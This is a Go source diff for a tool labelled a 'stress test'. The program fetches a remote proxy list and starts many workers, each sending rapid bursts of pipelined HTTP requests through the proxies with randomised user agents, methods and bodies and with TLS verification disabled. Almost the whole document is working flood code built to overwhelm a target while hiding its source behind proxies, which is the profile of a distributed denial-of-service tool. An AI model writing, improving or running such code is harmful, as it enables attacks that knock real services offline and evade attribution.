@@ -18,12 +18,18 @@ import (
     "time"
 )
 
-var (
-    httpMethods  = []string{"GET", "GET", "GET", "POST", "HEAD"}
-    languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
-    contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
-)
+// ProxyPool provides simple round-robin access to proxies
+// Workers will pick a single proxy at startup and stick with it
+// to ensure per-thread consistency
+ type ProxyPool struct {
+    proxies []string
+}
 
+func NewProxyPool(list []string) *ProxyPool {
+    return &ProxyPool{proxies: list}
+}
+
+// StressConfig holds test parameters
 type StressConfig struct {
     Target     *url.URL
     Threads    int
@@ -31,8 +37,14 @@ type StressConfig struct {
     CustomHost string
     Port       int
     Path       string
-    Proxies    []string
+    Pool       *ProxyPool
 }
+
+var (
+    httpMethods  = []string{"GET", "POST", "HEAD"}
+    languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
+    contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
+)
 
 func main() {
     rand.Seed(time.Now().UnixNano())
@@ -49,156 +61,91 @@ func main() {
         custom = os.Args[4]
     }
 
-    parsed, err := url.Parse(rawURL)
+    targetURL, err := url.Parse(rawURL)
     if err != nil {
         log.Fatalf("Invalid URL: %v", err)
     }
-    port := determinePort(parsed)
-    path := parsed.RequestURI()
+    port := determinePort(targetURL)
+    path := targetURL.RequestURI()
 
-    proxies, err := loadProxies("https://8080-jdpst224-projectdown-4rfkvo3lqbs.ws-us120.gitpod.io/proxies")
-    if err != nil {
+    proxyList, err := loadProxies("https://8080-jdpst224-projectdown-4rfkvo3lqbs.ws-us120.gitpod.io/proxies")
+    if err != nil || len(proxyList) == 0 {
         log.Fatalf("Failed to load proxies: %v", err)
     }
-    if len(proxies) == 0 {
-        log.Fatal("No proxies available")
-    }
+    pool := NewProxyPool(proxyList)
 
     cfg := &StressConfig{
-        Target:     parsed,
+        Target:     targetURL,
         Threads:    threads,
         Duration:   time.Duration(durSec) * time.Second,
         CustomHost: custom,
         Port:       port,
         Path:       path,
-        Proxies:    proxies,
+        Pool:       pool,
     }
 
     fmt.Printf("Starting stress test: %s | threads=%d | duration=%v | proxies=%d\n",
-        rawURL, cfg.Threads, cfg.Duration, len(cfg.Proxies))
+        rawURL, threads, cfg.Duration, len(proxyList))
     ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
     defer cancel()
+
     runWorkers(ctx, cfg)
     fmt.Println("Stress test completed.")
-}
-
-func loadProxies(urlStr string) ([]string, error) {
-    resp, err := http.Get(urlStr)
-    if err != nil {
-        return nil, err
-    }
-    defer resp.Body.Close()
-
-    var list []string
-    scanner := bufio.NewScanner(resp.Body)
-    for scanner.Scan() {
-        line := strings.TrimSpace(scanner.Text())
-        if line == "" {
-            continue
-        }
-        line = strings.TrimPrefix(line, "http://")
-        line = strings.TrimPrefix(line, "https://")
-        line = strings.TrimSuffix(line, "/")
-        list = append(list, line)
-    }
-    return list, scanner.Err()
-}
-
-func determinePort(u *url.URL) int {
-    if p := u.Port(); p != "" {
-        if pi, err := strconv.Atoi(p); err == nil {
-            return pi
-        }
-    }
-    if u.Scheme == "https" {
-        return 443
-    }
-    return 80
 }
 
 func runWorkers(ctx context.Context, cfg *StressConfig) {
     var wg sync.WaitGroup
     for i := 0; i < cfg.Threads; i++ {
         wg.Add(1)
-        go func(id int) {
+        // assign each worker a single proxy based on its index
+        proxy := cfg.Pool.proxies[i%len(cfg.Pool.proxies)]
+        go func(id int, proxyAddr string) {
             defer wg.Done()
-            var conn net.Conn
-            var isTLS bool
-            proxyIdx := id % len(cfg.Proxies) // start at different offsets
-
             ticker := time.NewTicker(50 * time.Millisecond)
             defer ticker.Stop()
-
             for {
                 select {
                 case <-ctx.Done():
-                    if conn != nil {
-                        conn.Close()
-                    }
                     return
                 case <-ticker.C:
-                    // add jitter up to ±10ms
+                    // jitter ±10ms
                     time.Sleep(time.Duration(rand.Intn(20)-10) * time.Millisecond)
-
-                    // ensure live connection
-                    if conn == nil {
-                        addr := cfg.Proxies[proxyIdx]
-                        target := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)
-                        c, tlsOn, err := dialViaProxy(addr, target, cfg)
-                        if err != nil {
-                            // rotate proxy & back off
-                            proxyIdx = (proxyIdx + 1) % len(cfg.Proxies)
-                            time.Sleep(100 * time.Millisecond)
-                            continue
-                        }
-                        conn, isTLS = c, tlsOn
+                    addr := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)
+                    conn, isTLS, err := connect(proxyAddr, addr)
+                    if err != nil {
+                        // retry on next tick
+                        continue
                     }
-
-                    // send smaller burst; on error, drop & rotate
-                    if err := sendBurst(conn, cfg, isTLS, 60); err != nil {
-                        conn.Close()
-                        conn = nil
-                        proxyIdx = (proxyIdx + 1) % len(cfg.Proxies)
-                    }
+                    sendBurst(conn, cfg, isTLS, 60)
+                    conn.Close()
                 }
             }
-        }(i)
+        }(i, proxy)
     }
     wg.Wait()
 }
 
-// sendBurst writes `count` pipelined requests over an existing conn
-func sendBurst(conn net.Conn, cfg *StressConfig, isTLS bool, count int) error {
-    for i := 0; i < count; i++ {
-        method := httpMethods[rand.Intn(len(httpMethods))]
-        header, body := buildRequest(cfg, method, isTLS)
-        bufs := net.Buffers{[]byte(header)}
-        if len(body) > 0 {
-            bufs = append(bufs, body)
-        }
-        if _, err := bufs.WriteTo(conn); err != nil {
-            return err
-        }
-    }
-    return nil
-}
-
-func dialViaProxy(proxyAddr, target string, cfg *StressConfig) (net.Conn, bool, error) {
-    d := &net.Dialer{Timeout: 5 * time.Second}
-    conn, err := d.Dial("tcp", proxyAddr)
+func connect(proxyAddr, target string) (net.Conn, bool, error) {
+    proxyURL, err := url.Parse("http://" + proxyAddr)
     if err != nil {
         return nil, false, err
     }
-    br := bufio.NewReader(conn)
-    isTLS := cfg.Port == 443
+    dialCtx := (&net.Dialer{Timeout: 5 * time.Second}).DialContext
+    conn, err := dialCtx(context.Background(), "tcp", proxyURL.Host)
+    if err != nil {
+        return nil, false, err
+    }
+    isTLS := strings.HasSuffix(target, ":443")
     if isTLS {
+        // issue CONNECT for HTTPS
         req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", target, target)
         if _, err := conn.Write([]byte(req)); err != nil {
             conn.Close()
             return nil, false, err
         }
-        status, err := br.ReadString('\n')
-        if err != nil || !strings.Contains(status, "200") {
+        br := bufio.NewReader(conn)
+        status, _ := br.ReadString('\n')
+        if !strings.Contains(status, "200") {
             conn.Close()
             return nil, false, fmt.Errorf("CONNECT failed: %s", status)
         }
@@ -209,10 +156,7 @@ func dialViaProxy(proxyAddr, target string, cfg *StressConfig) (net.Conn, bool, 
                 break
             }
         }
-        tlsConn := tls.Client(conn, &tls.Config{
-            InsecureSkipVerify: true,
-            ServerName:         cfg.Target.Hostname(),
-        })
+        tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true, ServerName: strings.Split(target, ":")[0]})
         if err := tlsConn.Handshake(); err != nil {
             tlsConn.Close()
             return nil, false, err
@@ -220,6 +164,35 @@ func dialViaProxy(proxyAddr, target string, cfg *StressConfig) (net.Conn, bool, 
         return tlsConn, true, nil
     }
     return conn, false, nil
+}
+
+func sendBurst(conn net.Conn, cfg *StressConfig, isTLS bool, count int) {
+    for i := 0; i < count; i++ {
+        method := httpMethods[rand.Intn(len(httpMethods))]
+        header, body := buildRequest(cfg, method, isTLS)
+        bufs := net.Buffers{[]byte(header)}
+        if len(body) > 0 {
+            bufs = append(bufs, body)
+        }
+        bufs.WriteTo(conn)
+    }
+}
+
+func loadProxies(urlStr string) ([]string, error) {
+    resp, err := http.Get(urlStr)
+    if err != nil {
+        return nil, err
+    }
+    defer resp.Body.Close()
+    var list []string
+    scanner := bufio.NewScanner(resp.Body)
+    for scanner.Scan() {
+        line := strings.TrimSpace(scanner.Text())
+        if line != "" {
+            list = append(list, line)
+        }
+    }
+    return list, scanner.Err()
 }
 
 func buildRequest(cfg *StressConfig, method string, viaTLS bool) (string, []byte) {
@@ -250,28 +223,16 @@ func buildRequest(cfg *StressConfig, method string, viaTLS bool) (string, []byte
     return buf.String(), body
 }
 
-func createBody(contentType string) []byte {
-    var b bytes.Buffer
-    switch contentType {
-    case "application/x-www-form-urlencoded":
-        vals := url.Values{}
-        for i := 0; i < 3; i++ {
-            vals.Set(randomString(5), randomString(8))
+func determinePort(u *url.URL) int {
+    if p := u.Port(); p != "" {
+        if pi, err := strconv.Atoi(p); err == nil {
+            return pi
         }
-        b.WriteString(vals.Encode())
-    case "application/json":
-        b.WriteByte('{')
-        for i := 0; i < 3; i++ {
-            if i > 0 {
-                b.WriteByte(',')
-            }
-            fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
-        }
-        b.WriteByte('}')
-    case "text/plain":
-        b.WriteString("text_" + randomString(12))
     }
-    return b.Bytes()
+    if u.Scheme == "https" {
+        return 443
+    }
+    return 80
 }
 
 func randomString(n int) string {
@@ -295,6 +256,30 @@ func randomUserAgent() string {
         return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, v, v)
     default:
         v := fmt.Sprintf("%d.0.%d", rand.Intn(16)+600, rand.Intn(100))
-        return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version/13.1 Safari/%s", os, v, v)
+        return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version=13.1 Safari/%s", os, v, v)
     }
+}
+
+func createBody(contentType string) []byte {
+    var b bytes.Buffer
+    switch contentType {
+    case "application/x-www-form-urlencoded":
+        vals := url.Values{}
+        for i := 0; i < 3; i++ {
+            vals.Set(randomString(5), randomString(8))
+        }
+        b.WriteString(vals.Encode())
+    case "application/json":
+        b.WriteByte('{')
+        for i := 0; i < 3; i++ {
+            if i > 0 {
+                b.WriteByte(',')
+            }
+            fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
+        }
+        b.WriteByte('}')
+    case "text/plain":
+        b.WriteString("text_" + randomString(12))
+    }
+    return b.Bytes()
 }
